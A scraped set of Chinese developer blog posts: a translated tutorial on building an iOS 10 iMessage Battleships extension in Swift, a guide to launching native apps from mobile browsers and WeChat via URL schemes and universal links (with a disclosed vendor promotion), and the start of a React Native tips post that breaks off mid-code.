<p>为了演示一下这个令人兴奋的插件功能，我们看一个简单的例子吧，这个插件可以让两个用户玩一个简化版的流行游戏 Battleships。为了让约束布局方面简单一些，我们只考虑竖屏的情况。为方便大家下载这个 demo，我把它放到<a href=""https://github.com/shinobicontrols/iOS10-day-by-day/tree/master/01%20-%20Messages"" rel=""nofollow noreferrer"">Github</a>上了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006773230"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""demo 动图"" title=""demo 动图""></span></p>
<p>游戏规则是这样的：</p>
<ul>
<li><p>玩家 A 发起游戏，在棋盘上布置两个『战舰』，然后隐藏起来</p></li>
<li><p>另一个玩家 B 要猜测战舰的位置</p></li>
<li><p>如果猜中了两艘隐藏战舰的位置，玩家 B 就赢了；但是如果猜错 3 次，玩家 B 就输了。</p></li>
</ul>
<h1>建工程</h1>
<p>用 Xcode 新建一个插件工程非常简单。只需点击 File -&gt; New Project，然后在窗口中选择 iMessage Application。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006133211"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""建工程"" title=""建工程""></span></p>
<p>给工程起个名字，然后语言选择 Swift（本系列均使用 Swift 语言示例），这就完事了。因为有一个自动生成的<code>MessagesExtension</code>target ，然后默认的<code>Info.plist</code>里带有必需的配置（插件界面的 storyboard 以及插件的类型等），所以只要运行工程，Messages 就能自动识别出我们的插件了。</p>
<h1>改 Display Name</h1>
<p>如果在模拟器里运行<code>MessagesExtension</code>这个 target，它会让你选择在哪个 app 里运行这个插件。我们选择<code>Messages</code>。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006133213"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""在 Messages 里运行"" title=""在 Messages 里运行""></span></p>
<blockquote><p>Messages 打开的时候，应该能在输入框下方看到我们的插件。如果看不到，可能需要点击 ""Applications"" icon，然后再点 4 个椭圆的 icon，从里面选择我们的插件。</p></blockquote>
<p>现在里面啥也没有，不过我们将很快改变这一点。眼下最迫切的是要把我们插件的 display name 改改：现在显示的是 ""MessagesExtension""（实际上是 ""MessagesEx..."" 后面被截掉了）。下面我们点击 target，然后把<code>Display Name</code>输入框里的名字改一改。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006133219"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""改 display name"" title=""改 display name""></span></p>
<h1>棋盘</h1>
<p>我们需要展示的是 3x3 的棋盘。有很多实现方法，我用的是 UICollectionView。在本教程里，画界面这一块并不重要，因此实现细节不再详述了。</p>
<h1>数据模型</h1>
<p>为了记录一局游戏本身以及游戏的状态，我们定义以下两个结构体：</p>
<pre><code class=""Swift"">struct GameConstants {
    /// 一共需要布置的战舰数
    static let totalShipCount = 2
    /// 允许玩家 B 失败的次数
    static let incorrectAttemptsAllowed = 3
}

struct GameModel {
    /// 战舰的位置
    let shipLocations: [Int]
    /// 游戏是否已经结束
    var isComplete: Bool
}</code></pre>
<h1>MessagesViewController</h1>
<p><code>MessagesViewController</code> 是我们插件的入口点。它是<code>MSMessagesAppViewController</code>的子类，相当于是 Messages 插件的 root View Controller。自动生成的模板里面包含了一些供我们重写的方法，比如插件启动状态下用户收到消息的回调函数。待会我们就要用到其中的一部分方法。</p>
<p>第一点要注意的是，我们的插件启动之后有两种可能的 presentation style：</p>
<ul>
<li><p>compact</p></li>
<li><p>expanded</p></li>
</ul>
<p><code>compact</code>是用户从应用托盘里打开插件的模式，插件显示在键盘区域里。<code>expanded</code>则多给了一些喘息的空间，插件占据大部分的屏幕。</p>
<p>为了让代码整洁一些，我们会用不同的 view controller 来分别实现两种模式，并且把这些 view Controller 都加为<code>MessagesViewController</code>的子 view controller。</p>
<h1>几个子 View Controller</h1>
<p>本文不会花太长篇幅来描述这些 controller 的实现细节，只会重点关注在收发信息的过程，游戏状态和数据是怎么变化的。关于具体实现，请自行阅读 Github 上的源码。</p>
<h2>GameStartViewController</h2>
<p>我们的插件刚启动的时候处于<code>compact</code>状态。这点空间并不够展示游戏的棋盘，在 iPhone 上尤其不够。我们可以简单粗暴地立即切换成<code>expanded</code>状态，但是苹果官方警告不要这么做，毕竟还是应该把控制权交给用户。</p>
<p>于是，我们来显示一个简单的欢迎界面，里面有一个 label 和一个 button。按下 button 的时候，再切换到游戏的主界面，用户就可以开始放置『战舰』了。</p>
<h2>Ship Location View Controller</h2>
<p>这个 view controller 是玩家 A 布置战舰的界面。</p>
<p>我们实现<code>gameBoard</code>的<code>onCellSelection</code>方法来控制 cell 的样式：上面有战舰的 cell 显示为绿色，空白的显示为蓝色。</p>
<p><code>shipsLeftToPosition</code>返回 0 时，结束按钮会变得可点。这个按钮的点击事件是一个叫<code>completedShipLocationSelection:</code>的<code>IBAction</code>方法，它会新建一个游戏 model，然后使用 UIImage 的 extension 来创建一张游戏棋盘的截图（我们会先<code>reset()</code>棋盘，所以截图的时候战舰的位置是隐藏的——现在可不是揭晓谜底的时候！）。这张截图在待会发消息的时候会用到。</p>
<h2>Ship Destroy View Controller</h2>
<p>当玩家 B 点击对话中的消息时，我们希望他能看到一个略微不同的 view controller —— 一个能让他寻找隐藏战舰的界面。</p>
<p>我们还是实现棋盘的<code>onCellSelection</code>方法。这一次我们把选择的 cell 位置与玩家 A 布置的位置匹配的（『击中战舰』）标为绿色，如果没有击中就标为红色。</p>
<p>游戏结束后，不管是因为 3 条命用完了，还是因为两条战舰都找出来了，我们都会相应地记录在数据模型中，然后调起游戏结束的回调。</p>
<h1>添加子 Controller</h1>
<p>回到我们的<code>MessagesViewController</code>，我们现在可以把子 controller 们加进去了。</p>
<pre><code class=""Swift"">class MessagesViewController: MSMessagesAppViewController {
    override func willBecomeActive(with conversation: MSConversation) {
        configureChildViewController(for: presentationStyle, with: conversation)
    }

    override func willTransition(to presentationStyle: MSMessagesAppPresentationStyle) {
        guard let conversation = self.activeConversation else { return }
        configureChildViewController(for: presentationStyle, with: conversation)
    }
}</code></pre>
<p>这两个方法是继承自<code>MSMessagesAppViewController</code>的，分别提醒我们插件启动了（比如被用户打开了）以及要变换到另一种 presentation style 了。我们利用这两个方法来配置子 view controller。</p>
<pre><code class=""Swift"">private func configureChildViewController(for presentationStyle: MSMessagesAppPresentationStyle,
                                              with conversation: MSConversation) {
    // 清空所有之前的子 view controller
    for child in childViewControllers {
        child.willMove(toParentViewController: nil)
        child.view.removeFromSuperview()
        child.removeFromParentViewController()
    }

    // 好，现在建一个新的吧
    let childViewController: UIViewController

    switch presentationStyle {
    case .compact:
        childViewController = createGameStartViewController()
    case .expanded:
        if let message = conversation.selectedMessage,
            let url = message.url {
            // 如果 conversation.selectedMessage 不为空，说明玩家 A 已经把战舰布置好了，当前是玩家 B
            // 所以我们需要显示能让玩家 B 选择位置来击沉战舰的界面
            let model = GameModel(from: url)
            childViewController = createShipDestroyViewController(with: conversation, model: model)
        }
        else {
            // 否则，我们就需要布置战舰了
            childViewController = createShipLocationViewController(with: conversation)
        }
    }

    // 添加子 view controller
    addChildViewController(childViewController)
    childViewController.view.frame = view.bounds
    childViewController.view.translatesAutoresizingMaskIntoConstraints = false
    view.addSubview(childViewController.view)

    childViewController.view.leftAnchor.constraint(equalTo: view.leftAnchor).isActive = true
    childViewController.view.rightAnchor.constraint(equalTo: view.rightAnchor).isActive = true
    childViewController.view.topAnchor.constraint(equalTo: view.topAnchor).isActive = true
    childViewController.view.bottomAnchor.constraint(equalTo: view.bottomAnchor).isActive = true

    childViewController.didMove(toParentViewController: self)
}</code></pre>
<p>上面这个方法决定了我们该向当前的用户展示哪个子 view controller。如果处于<code>compact</code> 模式，那么应该显示 ""start game"" 界面。</p>
<p>如果处于<code>expanded</code>模式，我们需要判断是 A 玩家还是 B 玩家。如果是 B 玩家在对话界面中点击消息，此时<code>conversation.selectedMessage</code>就不会是 nil，这说明游戏已经开始了，所以我们要展示<code>ShipDestroyViewController</code>。否则就展示<code>ShipLocationViewController</code>。</p>
<h1>切换界面模式</h1>
<p>在<code>GameStartViewController</code>点击 ""start game"" 按钮，我们希望插件能切换到<code>expanded</code>模式，好让我们展示棋盘。</p>
<pre><code class=""Swift"">// 在 'createGameStartViewController' 里
controller.onButtonTap = {
    [unowned self] in
    self.requestPresentationStyle(.expanded)
}</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006133221"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""切换到 expanded 模式"" title=""切换到 expanded 模式""></span></p>
<h1>创建『可以更新』的消息</h1>
<p>之前在 Messages 里面，任何新的内容——不管是新的短信还是表情——都会以一条新消息的形式出现在对话的底部，跟之前的所有消息都不相干。</p>
<p>然而，这一点可能带来很多麻烦：比如，一个下国际象棋的游戏插件会造成每走一步棋都要发一条新消息。而我们理想中的情况应该是更新后的消息能代替之前的消息。</p>
<p>谢天谢地，苹果也想到了这一点，给我们提供了一个类<a href=""https://developer.apple.com/reference/messages/mssession"" rel=""nofollow noreferrer"">MSSession</a>——这个类没有属性也没有方法，只是用来更新消息的。</p>
<p>我们发一条消息的时候，就用这个 session 来告诉 Messages，要覆盖此前 session 相同的信息。前一条信息会被从聊天记录中移除，然后新的信息插入到底部。</p>
<h1>使用联系人姓名</h1>
<p>最近几年，苹果一直说要把保护用户隐私当做头等大事。对 Messages framework 来说确实如此：你并不能得到用户的身份，只能得到一个每个设备不同的<a href=""https://developer.apple.com/reference/foundation/uuid"" rel=""nofollow noreferrer"">UUID</a>。也就是说，你不能在消息里加入发消息的用户的身份 ID，然后指望收消息的用户能通过这个 ID 识别出发消息的是谁。</p>
<blockquote><p>另外，你只能访问到用户点击的那条消息的内容，不能访问到对话中任何其他消息的内容（而且点击的这条消息还必须是从你的插件发出来的）。</p></blockquote>
<p><a href=""https://developer.apple.com/reference/messages/msconversation"" rel=""nofollow noreferrer"">MSConversation</a> 这个类有两个属性<code>localParticipantIdentifier</code>和<code>remoteParticipantIdentfiers</code>，可以用来显示对话双方的名字。要加一个前缀<code>$</code>。</p>
<pre><code>let player = ""$\(conversation.localParticipantIdentifier)""</code></pre>
<p>把它放在消息里发出去，Messages 会解析这个 UUID，然后显示出对应的联系人姓名。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006133222"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""显示联系人姓名"" title=""显示联系人姓名""></span></p>
<h1>收发应用数据</h1>
<p>游戏状态的数据是以 URL 的形式传递的。你的插件装在任意一台手机上，都应该有能力解析这个 URL，展示相关的内容。</p>
<p>使用 URL 的另一个好处是，它还能为 MacOS 用户提供一个备用方案。不幸的是，MacOS 上的 Messages 应用并不支持插件功能。文档里是这样说的：</p>
<blockquote><p>如果在 macOS 上点击这条信息，系统会转到 web 浏览器打开这个 URL。所以这个 URL 应该定向到你自己的 web service，基于 URL 里 encode 的数据为用户呈现合理的结果。</p></blockquote>
<p>要构建这个 URL，我们可以使用<code>URLComponents</code>，组合一个 base url 和一群<code>URLQueryItems</code>（都是有效的键值对）。</p>
<pre><code class=""Swift"">extension GameModel {
    func encode() -&gt; URL {
        let baseURL = ""www.shinobicontrols.com/battleship""

        guard var components = URLComponents(string: baseURL) else {
            fatalError(""Invalid base url"")
        }

        var items = [URLQueryItem]()

        // 战舰的位置
        let locationItems = shipLocations.map {
            location in
            URLQueryItem(name: ""Ship_Location"", value: String(location))
        }

        items.append(contentsOf: locationItems)

        // 游戏结束
        let complete = isComplete ? ""1"" : ""0""

        let completeItem = URLQueryItem(name: ""Is_Complete"", value: complete)
        items.append(completeItem)

        components.queryItems = items

        guard let url = components.url else {
            fatalError(""Invalid URL components"")
        }

        return url
    }
}</code></pre>
<p>最后得出的 url 结果形如：<code>www.shinobicontrols.com/battleship?Ship_Location=0&amp;Ship_Location=1&amp;Is_Complete=0</code></p>
<p>而解码基本与此过程相反：先得到 url，取出每个键值对，由每个对应的值来构建游戏的数据模型。</p>
<h1>在聊天对话中插入信息</h1>
<p>经过前面的艰苦努力，我们终于创建出了这条消息，准备好让玩家在对话中发给其他玩家了。</p>
<pre><code class=""Swift"">/// 构建一条消息，然后插入到对话中
func insertMessageWith(caption: String,
                   _ model: GameModel,
                   _ session: MSSession,
                   _ image: UIImage,
                   in conversation: MSConversation) {
    let message = MSMessage(session: session)
    let template = MSMessageTemplateLayout()
    template.image = image
    template.caption = caption
    message.layout = template
    message.url = model.encode()

    // 我们构建好这条消息之后，把它插入对话中
    conversation.insert(message)
}</code></pre>
<p>就像前面说过的那样，这条消息是用一个 session 创建的，这样我们就可以覆盖对话中同一个 session 的信息了。</p>
<p>为了修改消息的外观，我们要用到<a href=""https://developer.apple.com/reference/messages/msmessagetemplatelayout"" rel=""nofollow noreferrer"">MSMessageTemplateLayout</a>。它能让我们修改消息的一系列属性，在这个例子里主要用到<code>caption</code>（文字）和<code>image</code>（图片）。</p>
<p>修改完消息的外观，配置好 session 和 URL 属性，我们终于可以把消息插进对话中了。最后这行代码会把消息放进 Messages 的输入框里。注意：我们没有权限直接把这条消息发出去——只能放进输入框里。</p>
<h1>结束啦</h1>
<p>插入完这条消息之后，我们的插件也没有必要再在这闲待着了。用户可以手动把它关掉，不过为了让他们体验好一点，所以我们调用这行代码，自己结束掉<code>MessagesViewController</code>的生命：</p>
<pre><code>self.dismiss()</code></pre>
<h1>扩展阅读</h1>
<p>谢谢你看完这么长一篇文章，希望能让你对于 iOS 10 Message 应用的强大功能略窥一二。</p>
<p>目前的 beta 版肯定少不了一些小问题：iOS 模拟器启动 Messages 应用速度很慢，而且有时就是加载不出来插件——我经常需要从 Messages 的应用托盘里手动重启我的插件。而且 Messages framework 非常『絮叨』：打出来的 log 简直多到极点。当然，在 iOS 10 结束 beta 之后这些问题都会得到解决，不过目前这种状态下你还是需要一双火眼金睛，从大量 debug 信息里寻找跟你插件有关的内容，比如 AutoLayout constraint 冲突之类。</p>
<p>如果你还想继续往下探索，我推荐你看这场 <a href=""https://developer.apple.com/videos/play/wwdc2016/224/"" rel=""nofollow noreferrer"">WWDC 视频</a>，也可以看看苹果官方的例子工程：里面可以学到很多有趣的小 tips，例如如何优雅地解析 URL。</p>
<p>如果有任何问题和评论，我们都很欢迎你的反馈。可以发我 tweet <a href=""https://twitter.com/sam_burnstone"" rel=""nofollow noreferrer"">@sam_burnstone</a>，也可以关注 <a href=""http://twitter.com/shinobicontrols"" rel=""nofollow noreferrer"">@shinobicontrols</a> 关注最新动态以及 iOS 10 Day by Day 系列的更新。感谢阅读！</p>
<blockquote>
<p>原文地址：<a href=""https://www.shinobicontrols.com/blog/ios-10-day-by-day-day-1-messages"" rel=""nofollow noreferrer"">iOS 10 Day by Day :: Day 1 :: Messages</a>  </p>
<p>原作者：Sam Burnstone <a href=""https://twitter.com/sam_burnstone"" rel=""nofollow noreferrer"">@sam_burnstone</a> </p>
<p>ShinobiControls 官网：<a href=""https://www.shinobicontrols.com/"" rel=""nofollow noreferrer"">ShinobiControls.com</a> twitter : <a href=""https://twitter.com/shinobicontrols"" rel=""nofollow noreferrer"">@shinobicontrols</a></p>
<p>文集地址：<a href=""http://www.jianshu.com/notebooks/5278512/latest"" rel=""nofollow noreferrer"">iOS 10 day by day 仓薯翻译</a></p>
<p>译者：<a href=""http://www.jianshu.com/users/c1442ed9959c/latest_articles"" rel=""nofollow noreferrer"">戴仓薯</a></p>
</blockquote>

                ", [iOS 10 day by day] Day 1：开发 iMessage 的第三方插件,1531972012,240,1,956,1,1,https://segmentfault.com/a/1190000006132788
93,1,0,6,"
                    
<p>在移动互联网，链接是比较重要的传播媒质，但很多时候我们又希望用户能够回到APP中，这就要求APP可以通过浏览器或在微信中被方便地唤起。</p>
<p>这是一个既直观又很好的用户体验，但在实现过程中会遇到各种问题：</p>
<ol>
<li><p>如何解决未安装APP时的做好引导页</p></li>
<li><p>如何在微信中唤醒APP</p></li>
<li><p>在iOS9中如何处理universal link被用户误关的情况</p></li>
<li><p>如何解决Android各种机型、各种第三方浏览器导致的兼容问题等</p></li>
<li><p>在APP未安装情况下，引导用户下载后打开APP后，如何进入之前唤起时指定的页面或内容，即如何实现场景还原</p></li>
<li><p>在微信中唤醒APP时，如何进入指定的页面或内容</p></li>
</ol>
<p>下面是我一些个人的经验分享。</p>
<h2>浏览器中打开</h2>
<h3>iOS/Android APP配置</h3>
<p>这块内容其实比较简单，在网上都有很多资料可供查阅，就不再赘述。</p>
<h3>原理说明</h3>
<p>首先需要说明，不管iOS还是Android，浏览器都不可能预知本地是否安装了某个APP的。或者更严谨地说，我们不能通过浏览器来预知本地是否安装。因为就算浏览器可以读取本地应用的安装列表，但是目前也没任何一家浏览器提供查询的API，所以这条路是走不通的。</p>
<p>本质上浏览器是通过URL scheme打开APP，一个APP可以设置一个或多个打开自己的URL scheme。比如，Twitter就注册自己能被「twitter://」打开。</p>
<p>其实，如果是做APP间相互跳转是比较简单的。iOS就可以使用 UIApplication 的 canOpenUrl 方法来检测URL scheme 是否能打开对应的APP。比如，如果「twitter://」检测能被打开，也就说明本地安装了 Twitter 。再用 UIApplication 的 openURL 方法，就能打开Twitter了。Android 中的做法类似。</p>
<h3>实现方案</h3>
<p>因为iOS9和之前的iOS系统有区别，所以这里我们也要区别对待。</p>
<h4>iOS7/iOS8</h4>
<p>iOS中默认通过Safari打开URL scheme，方法一般如下两种：</p>
<ol>
<li><p>直跳方式：点击链接、修改 window.location 等。</p></li>
<li><p>iframe 方式：在 body 上添加 iframe，设置src属性为跳转的URL scheme。</p></li>
</ol>
<p>第一种情况：</p>
<pre><code class=""html"">&lt;a href=""schemeUrl""&gt;唤醒你的APP&lt;/a&gt;</code></pre>
<p>或者</p>
<pre><code class=""javascript"">window.location.href = schemeUrl;</code></pre>
<p>但在第一种情况，如果APP唤醒失败，或者APP未安装的话，很多时候都会跳到错误页，这很影响用户体验，而我们的要求可能是跳转到其他页面或者下载APP。</p>
<p>后一种方法不会引起页面可见的变化（例如页面内容变成一个新页面），不会导致浏览器历史记录的变化，大致实现如下：</p>
<pre><code class=""javascript"">&lt;a href=""APP下载地址""&gt;下载或打开APP&lt;/a&gt;
&lt;script&gt;
$('a').click(function() {
    var ifr = document.createElement('iframe');
    ifr.src = '自定义 URL scheme';
    ifr.style.display = 'none';
    document.body.appendChild(ifr);
    setTimeout(function(){
        document.body.removeChild(ifr);
    }, 3000);
});
&lt;/script&gt;</code></pre>
<p>过程是这样：点击 a 标签时，首先会尝试打开URL scheme，如果成功，就唤起APP；如果失败，则跳转到 href 属性，即下载页。</p>
<h4>Android</h4>
<p>但这个方案在很多安卓机型上有问题，为保证可用，改用第一种方案：</p>
<pre><code class=""javascript"">$('a').click(function() {
    location.href = '自定义 URL scheme';
    t = Date.now();
    setTimeout(function(){
        if (Date.now() - t &lt; 1200) {
            location.href = 'Android 下载地址';
        }
    }, 1000);
    return false;
}</code></pre>
<p>理想过程是这样：浏览器尝试打开 URL scheme，在1秒计时后，检查当前时间，如果实际时间已过 1200 毫秒，说明唤起APP 成功（唤起 APP 会让浏览器的定时器变慢）；如果没超过 1200 毫秒，很可能是没有安装应用，就跳到下载地址。</p>
<p>或者换种方式：</p>
<pre><code class=""javascript"">var ifr = document.createElement('iframe');
ifr.src = 'com.baidu.tieba://';
ifr.style.display = 'none';
document.body.appendChild(ifr);
var openTime = +new Date();
window.setTimeout(function(){
    document.body.removeChild(ifr);
    if( (+new Date()) - openTime &gt; 2500 ){
        window.location = 'http://exam.com/xxxx.apk';
    }
},2000)</code></pre>
<p>但原理都是一样，利用setTimeout。但这其实不稳定，因为Android是基于Linux的分时多任务的，setTimeout的基准偏差可能会没那么大。</p>
<p>但如果设置比较小的运行间隔（&lt;30ms），在浏览器或者webview中，应用切换到后台，<code>setInterval</code>会被很明显的延迟执行，比如设置一个运行间隔20ms，总计运行100次的定时器，如果页面一直处于前台，则100次跑完，总耗时与 100x20=2000ms不会有太大差异，但页面在后台运行时，此时间会明显超过2000ms。可以利用这一点来实现是否成功打开APP检测及回调。</p>
<pre><code class=""javascript"">function openApp(openUrl, appUrl, action, callback) {
    //检查app是否打开
    function checkOpen(cb){
        var _clickTime = +(new Date());
        function check(elsTime) {
            if ( elsTime &gt; 3000 || document.hidden || document.webkitHidden) {
                cb(1);
            } else {
                cb(0);
            }
        }
        //启动间隔20ms运行的定时器，并检测累计消耗时间是否超过3000ms，超过则结束
        var _count = 0, intHandle;
        intHandle = setInterval(function(){
            _count++;        
            var elsTime = +(new Date()) - _clickTime;
            if (_count&gt;=100 || elsTime &gt; 3000 ) {
                clearInterval(intHandle);
                check(elsTime);
            }
        }, 20);
    }
    
    //在iframe 中打开APP
    var ifr = document.createElement('iframe');
    ifr.src = openUrl;
    ifr.style.display = 'none';
    if (callback) {
        checkOpen(function(opened){
            callback &amp;&amp; callback(opened);
        });
    }
    
    document.body.appendChild(ifr);      
    setTimeout(function() {
        document.body.removeChild(ifr);
    }, 2000);  
}</code></pre>
<p>另外，可以通过 <code>document.hidden</code> 或 <code>document.[webkit|moz|ms]Hidden</code> 来判断页面是否被置入后台（即应用被唤起），或<code>visibilitychange</code>事件，但对于Android 4.4版本一下则不支持。</p>
<h4>iOS9</h4>
<p>在 iOS 9 上，iframe 方案变得不可用。<br>按不能使用之前Android的代码，因为在打开自定义 URL scheme 时，会弹出对话框，询问是否用 xx 应用来打开。往往用户还没来得及点击打开，定时器又触发了，导致跳到 App Store。</p>
<p>可以在尝试打开URL scheme 后，再加一个页面跳转，这样对话框会被覆盖，再刷新页面，就能无需确认唤起APP：</p>
<pre><code class=""javascript"">$('a').click(function() {
    location.href = '自定义 URL scheme';
    location.href = '下载页';
    location.reload();
}</code></pre>
<p>这里，下载页延时 2 秒跳转到 App Store。</p>
<p>APP已安装这是没问题的，但如果APP未安装，跳 App Store 的请求会失败。<br>这时可以使用两个定时器：</p>
<pre><code class=""javascript"">$('a').click(function() {
    location.href = '自定义 URL scheme';
    setTimeout(function() {
        location.href = '下载页';
    }, 250);
    setTimeout(function() {
        location.reload();
    }, 1000);
}</code></pre>
<p>不过在iOS9中其实是支持universal link的，就是一个http域名形式，在微信中都可以唤起APP。如果未安装的话，可以直接引导用户去APP store下载。</p>
<p>可以参考这篇文章</p>
<p><a href=""http://www.magicwindow.cn/doc/#universal-link-info"" rel=""nofollow noreferrer"">http://www.magicwindow.cn/doc...</a></p>
<h4>没有完美的解决方案</h4>
<p>主要是在安卓上，总归会有各种兼容问题，知乎的解决办法是，提供两个按钮，一个下载，一个打开APP，让用户自己选。</p>
<h2>微信中打开</h2>
<p>因为微信将唤起本地APP的接口给禁了，所以微信中是不能直接唤起APP的，一般做法是提示用户在浏览器中打开，之后的流程还是我们上面讲的内容。</p>
<p>但是，在iOS9中，这个限制是可以突破的，也就是说可以直接唤起APP。方法就是使用我们上文提到的universal link。</p>
<p>在Android和iOS8及其以下系统中，我们可以利用腾讯的亲儿子：应用宝。简单讲，就是把你的唤起地址配置成你APP的应用宝地址，微信中跳转到这个地址后，如果用户已经安装了APP，则可直接唤起，如果没有安装，则可直接点击下载，如下图示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVzSbE"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>但这里有坑需要注意。</p>
<p>对于使用universal link来说，如下图所示用户在微信中打开APP之后，可能不小心点击右上角的链接（比方说点几分享，却不小心点击了""mlinks.cc""），导致跳到外部浏览器中，如下图所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVzSbF"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>这时候再在微信中就打不开APP了，因为universal link已被关闭，这是iOS9的机制，没法改变，这时候用户再在微信中打开，就得需要一个中间页来引导用户在外部浏览器中打开APP，如下图所示：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVzSbG"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>另外，在微信中唤醒APP默认只能到达首页，即不能到达指定页面或内容，如果想要做，则需要额外的处理。</p>
<h2>拿来主义</h2>
<p>从以上内容可以总结出：要做一个兼容性很好的方案，就需要考虑各种情况，在不同的情况适配不同的方案，比方说用户是在手机浏览器打开还是微信中打开，或者是在pc中打开，universal link是否被关闭等，这就使代码实现变得复杂，且容易出错，且还有安卓平台机型众多、浏览器众多等导致的兼容问题。</p>
<p>如果觉得实现难度或者成本太高，你可以考虑使用魔窗的mLink。只要你加了魔窗的sdk，就可以通过类似“<a href=""https://s.mlinks.cc/AA01"" rel=""nofollow noreferrer"">https://s.mlinks.cc/AA01</a>”的链接，在任何环境下打开你的APP（如果在pc机上打开，浏览器中将会出现APP下载地址的二维码），上面提到的问题都不复存在，并且魔窗已经兼容超过600台以上安卓机型的第三方主流浏览器。而且关键的是，不管是在手机浏览器中，还是在微信中打开，你可以指定唤起APP后直达APP中的某个页面或内容（某个促销商品等），就算用户没安装APP，点击下载安装之后，再打开，还是跳转到指定的页面，这就是场景还原，或者叫做Deffered Deep Linking。</p>
<p>欢迎访问魔窗官网：<a href=""http://www.magicwindow.cn/"" rel=""nofollow noreferrer"">http://www.magicwindow.cn/</a></p>
<p>利益相关：魔窗员工。</p>

                ", iOS/Android 浏览器(h5)及微信中唤起本地APP,1531972014,533,1,379,1,1,https://segmentfault.com/a/1190000006127431
94,1,0,6,"
                    
<p><span class=""img-wrap""><img data-src=""/img/bVzxDW"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>相信好多写React Native的都是前端出身，当然遇见问题的，也很多时候会想从前端出发，但由于React Native本身的限制，并不是支持足够多的属性和样式，所以Bo主结合自己的开发实践,并总结了一些将来开发可能会遇见的问题并给出一些小的代码参考;(PS实现不好的希望能大家提出看法，自己也会更新)。</p>
<p>自己将代码放到了<code>example</code>下，并且做成了一个App.这样可以查看具体运行效果：</p>
<p>截图1:</p>
<p><span class=""img-wrap""><img data-src=""/img/bVzxDy"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""vuedf40e6bef8963252bd7eaa81f689e5c56.jpg"" title=""vuedf40e6bef8963252bd7eaa81f689e5c56.jpg""></span></p>
<p><a href=""https://github.com/JackPu/react-native-tips"" rel=""nofollow noreferrer"">项目地址</a></p>
<h2>开始</h2>
<pre><code class=""bash"">git clone https://github.com/JackPu/react-native-tips.git</code></pre>
<p>进入example 目录</p>
<pre><code class=""bash"">react-native start</code></pre>
<p>用xcode打开ios目录下的项目，运行就可以看到上面的运行界面了。</p>
<h3>1.关于按钮</h3>
<p>写习惯了html我们看到按钮，第一时间想到的便是Button,但是目前React Native并没有这个组件，不过没关系，我们可以使用 <a>TouchableHighlight</a>,<a href=""https://facebook.github.io/react-native/docs/touchableopacity.html"" rel=""nofollow noreferrer"">TouchableOpacity</a>来实现按钮组件，当然常用的样式可以应用在上面，形成格式各样的按钮。</p>
<pre><code class=""js"">&lt;TouchableHighlight onPress={this._onPressButton}&gt;
      &lt;Text&gt;This is Button&lt;/Text&gt;
&lt;/TouchableHighlight&gt;</code></pre>
<p>如果你实在非常喜欢按钮的话，没关系，我们引入已经封装好的组件<code>react native button</code></p>
<pre><code class=""bash"">npm install react-native-button --save</code></pre>
<p>安装好后，你就可以大胆的这样写了:</p>
<pre><code class=""js"">&lt;Button
    style={[Css.btn,Css.btnP]}
    styleDisabled={{color: 'red'}}
    onPress={() =&gt; this._handlePress()}&gt;
    This is a button
  &lt;/Button&gt;</code></pre>
<h3>2.文字过长隐藏的问题</h3>
<p>CSS3中大家可能都会用到<code>text-oveflow</code>，然而RN 的Text并没有这个属性，不过我们可以通过设置<a href=""https://facebook.github.io/react-native/docs/text.html#content"" rel=""nofollow noreferrer"">numberOfLIne</a> 或者JS自动计算来实现:</p>
<pre><code class=""javascript"">&lt;Text numberOfLines={1}&gt;your long text here&lt;Text&gt;</code></pre>
<h3>3.关于百分比宽度</h3>
<p>写样式的时候有的时候我们经常会用到百分比，然而React Native并不支持这样的单位，除了用Flex布局外，我们可以通过另外一个方式获得:<code>Dimensions</code>。当然由于都是<code>JS</code>因此我们可以取巧，用JS计算下，比如30%,</p>
<pre><code>var React = require('react-native');

var {Dimensions,StyleSheet,Component} = React;
// 我们可以使用Dimensions 去获取窗口宽度
var fullWidth = Dimensions.get('window').width; 

let thirtyPercentiWidth = fullWidth * 0.3;

// Your stylesheet
var styles = StyleSheet.create({
    .wrap{
        width: thirtyPercentiWidth,
    }
});</code></pre>
<h3>4.Grid列表</h3>
<p>在App中的常用的列表除了水平列表外，我们还需要栅格化的列表。比如类似于下面这样：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVzxDO"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""vuedcfb38c068d0c35a44b4bbc8a37ebeb10.png"" title=""vuedcfb38c068d0c35a44b4bbc8a37ebeb10.png""></span></p>
<p>做出类似的界面其实只要限制住你每一个小方块的宽度就行了。</p>
<pre><code class=""js"">var styles = StyleSheet.create({
  list: {
    justifyContent: 'flex-start',
    flexDirection: 'row',
    flexWrap: 'wrap'
  },
  row: {
    justifyContent: 'center',
    padding: 5,
    margin: 5,
    width: (Dimensions.get('window').width - 30) / 3,
    height: 100,
    backgroundColor: '#fff',
    alignItems: 'center',
  },
  thumb: {
    width: 55,
    height: 55
  },
  text: {
    flex: 1,
    marginTop: 10,
  }

});

// render row

 &lt;TouchableHighlight onPress={() =&gt; this._pressRow(rowID,rowData)} underlayColor='rgba(0,0,0,0)'&gt;
            &lt;View&gt;
